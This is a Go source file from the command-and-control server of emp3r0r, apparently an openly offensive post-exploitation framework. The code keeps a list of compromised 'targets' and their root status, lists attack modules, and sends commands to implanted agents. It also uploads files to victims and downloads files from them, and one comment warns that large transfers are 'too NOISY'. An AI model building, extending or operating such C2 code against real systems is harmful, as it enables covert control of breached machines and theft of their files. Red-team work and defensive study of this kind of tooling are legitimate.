package cc

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
)

var (
	// EmpRoot root directory of emp3r0r
	EmpRoot, _ = os.Getwd()

	// Targets target list, with control (tun) interface
	Targets = make(map[*agent.SystemInfo]*Control)

	// ShellRecvBuf h2conn buffered here
	ShellRecvBuf = make(chan []byte)
)

const (
	// Temp where we save temp files
	Temp = "/tmp/emp3r0r/"

	// WWWRoot host static files for agent
	WWWRoot = Temp + tun.FileAPI

	// FileGetDir where we save #get files
	FileGetDir = "/tmp/emp3r0r/file-get/"
)

// Control controller interface of a target
type Control struct {
	Index int
	Conn  *h2conn.Conn
}

// ListTargets list currently connected targets
func ListTargets() {
	color.Cyan("Connected targets\n")
	color.Cyan("=================\n\n")

	indent := strings.Repeat(" ", len(" [0] "))
	hasroot := color.HiRedString("NO")
	for target, control := range Targets {
		if target.HasRoot {
			hasroot = color.HiGreenString("YES")
		}
		fmt.Printf(" [%s] Tag: %s (root: %v):"+
			"\n%sCPU: %s"+
			"\n%sMEM: %s"+
			"\n%sOS: %s"+
			"\n%sKernel: %s - %s"+
			"\n%sFrom: %s"+
			"\n%sIPs: %v",
			color.CyanString("%d", control.Index), target.Tag, hasroot,
			indent, target.CPU,
			indent, target.Mem,
			indent, target.OS,
			indent, target.Kernel, target.Arch,
			indent, target.IP,
			indent, target.IPs)
	}
}

// GetTargetFromIndex find target from Targets via control index
func GetTargetFromIndex(index int) (target *agent.SystemInfo) {
	for t, ctl := range Targets {
		if ctl.Index == index {
			target = t
			break
		}
	}
	return
}

// GetTargetFromTag find target from Targets via tag
func GetTargetFromTag(tag string) (target *agent.SystemInfo) {
	for t := range Targets {
		if t.Tag == tag {
			target = t
			break
		}
	}
	return
}

// ListModules list all available modules
func ListModules() {
	color.Cyan("Available modules\n")
	color.Cyan("=================\n\n")
	for mod := range ModuleHelpers {
		color.Green("[+] " + mod)
	}
}

// Send2Agent send MsgTunData to agent
func Send2Agent(data *agent.MsgTunData, agent *agent.SystemInfo) (err error) {
	ctrl := Targets[agent]
	if ctrl == nil {
		return errors.New("Send2Agent: Target is not connected")
	}
	out := json.NewEncoder(ctrl.Conn)

	err = out.Encode(data)
	return
}

// PutFile put file to agent
func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
	// open and read the target file
	f, err := os.Open(lpath)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	bytes, err := ioutil.ReadAll(f)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}

	// file sha256sum
	sum := sha256.Sum256(bytes)

	// file size
	size := len(bytes)
	sizemB := float32(size) / 1024 / 1024
	if sizemB > 20 {
		return errors.New("please do NOT transfer large files this way as it's too NOISY, aborting")
	}
	CliPrintWarning("\nPutFile:\nUploading '%s' to\n'%s' "+
		"on %s, agent [%d]\n"+
		"size: %d bytes (%.2fmB)\n"+
		"sha256sum: %x",
		lpath, rpath,
		a.IP, Targets[a].Index,
		size, sizemB,
		sum,
	)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := agent.MsgTunData{
		Payload: "FILE" + agent.OpSep + rpath + agent.OpSep + payload,
		Tag:     a.Tag,
	}

	// send
	err = Send2Agent(&fileData, a)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	return nil
}

// GetFile get file from agent
func GetFile(filepath string, a *agent.SystemInfo) error {
	var data agent.MsgTunData
	cmd := fmt.Sprintf("#get %s", filepath)

	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
	data.Tag = a.Tag
	err := Send2Agent(&data, a)
	if err != nil {
		CliPrintError("GetFile: %v", err)
		return err
	}
	return nil
}
